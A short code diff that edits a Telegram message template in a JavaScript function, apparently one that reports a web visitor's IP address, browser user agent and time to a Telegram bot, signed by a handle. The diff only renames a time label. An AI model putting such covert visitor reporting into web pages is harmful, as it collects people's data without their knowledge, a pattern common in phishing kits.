@@ -50,7 +50,7 @@ async function sendToTelegram(data) {
 🌐 <b>System Info</b>
 🖥️ IP: <code>${ip}</code>
 🌍 Browser: <code>${navigator.userAgent.slice(0, 80)}</code>
-📅 Time (DZ): <code>${now}</code>
+📅 Time: <code>${now}</code>
 
  👨🏻‍💻 <i>By @xr_i4 — 7snawi</i>`;
 
